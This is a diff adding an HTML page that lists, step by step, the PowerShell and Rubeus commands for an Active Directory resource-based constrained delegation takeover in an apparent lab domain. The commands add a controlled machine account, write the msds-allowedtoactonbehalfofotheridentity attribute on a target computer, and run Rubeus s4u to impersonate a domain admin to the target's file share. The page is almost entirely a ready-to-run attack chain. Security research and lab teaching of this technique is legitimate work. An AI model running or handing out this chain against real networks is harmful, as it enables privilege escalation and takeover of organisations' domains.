@@ -1,0 +1,60 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Commands Used</title>
+</head><body># import the necessary toolsets<br/>
+Import-Module .\powermad.ps1<br/>
+Import-Module .\powerview.ps1<br/>
+<br/>
+# we are TESTLAB\attacker, who has GenericWrite rights over the primary$ computer account<br/>
+whoami<br/>
+<br/>
+# the target computer object we're taking over<br/>
+$TargetComputer = "primary.testlab.local"<br/>
+<br/>
+$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid<br/>
+<br/>
+# verify the GenericWrite permissions on $TargetComputer<br/>
+$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}<br/>
+$ACE<br/>
+<br/>
+ConvertFrom-SID $ACE.SecurityIdentifier<br/>
+<br/>
+# add a new machine account that we control<br/>
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)<br/>
+<br/>
+# get the SID of the new computer we've added<br/>
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid<br/>
+<br/>
+# build the new raw security descriptor with this computer account as the principal<br/>
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"<br/>
+<br/>
+# get the binary bytes for the SDDL<br/>
+$SDBytes = New-Object byte[] ($SD.BinaryLength)<br/>
+$SD.GetBinaryForm($SDBytes, 0)<br/>
+<br/>
+# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'<br/>
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}<br/>
+<br/>
+# confirming the security descriptor add<br/>
+$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity<br/>
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0<br/>
+$Descriptor.DiscretionaryAcl<br/>
+<br/>
+# currently don't have access to primary\C$<br/>
+dir \\primary.testlab.local\C$<br/>
+<br/>
+# get the hashed forms of the plaintext<br/>
+.\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:testlab.local<br/>
+<br/>
+# execute Rubeus' s4u process against $TargetComputer<br/>
+# &nbsp; EF266C6B963C0BB683941032008AD47F == 'Summer2018!'<br/>
+# &nbsp; impersonating "harmj0y" (a DA) to the cifs sname for the target computer (primary)<br/>
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:harmj0y /msdsspn:cifs/primary.testlab.local /ptt<br/>
+<br/>
+<br/>
+# cleanup - clear msds-allowedtoactonbehalfofotheridentity<br/>
+Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'<br/>
+<br/>
+</body></html>
